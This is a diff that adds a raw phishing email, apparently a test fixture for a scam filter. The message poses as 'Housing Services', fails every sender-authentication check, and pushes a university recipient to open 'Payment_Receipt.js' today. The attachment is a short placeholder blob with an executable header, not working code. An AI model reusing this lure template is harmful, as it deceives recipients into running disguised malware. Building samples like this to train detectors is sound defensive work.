@@ -1,0 +1,45 @@
+From: Housing Services <office@secure-docs.click>
+To: lucia.sutanto@harrowgate.ac.uk
+Return-Path: <office@secure-docs.click>
+Subject: Document for your review
+Date: Sat, 31 Oct 2026 03:13:00 +0000
+Message-ID: <57c7b7b56ea7@secure-docs.click>
+Authentication-Results: mx.harrowgate.ac.uk; spf=softfail
+ smtp.mailfrom=secure-docs.click; dkim=fail header.d=secure-docs.click;
+ dmarc=fail header.from=secure-docs.click
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="==ScamShieldaf341ef40b0=="
+
+--==ScamShieldaf341ef40b0==
+Content-Type: multipart/alternative; boundary="==ScamShielddaa25d6b291=="
+
+--==ScamShielddaa25d6b291==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hello,
+
+Please open the attached document and complete it today.
+
+Thank you.
+
+--==ScamShielddaa25d6b291==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>Hello,</p><p>Please open the attached document and complete it=
+ today.</p><p>Thank you.</p></body></html>
+
+--==ScamShielddaa25d6b291==--
+
+--==ScamShieldaf341ef40b0==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Payment_Receipt.js"
+MIME-Version: 1.0
+
+TVpDZSGrpUx1UO3A7xICdZ//kP8ZEok2gUMh7lnhEeE+XkgocNWLtE2c+/zOp4cCqtGNTO6pGvDg
+IkMd4xu+jSdF
+
+--==ScamShieldaf341ef40b0==--
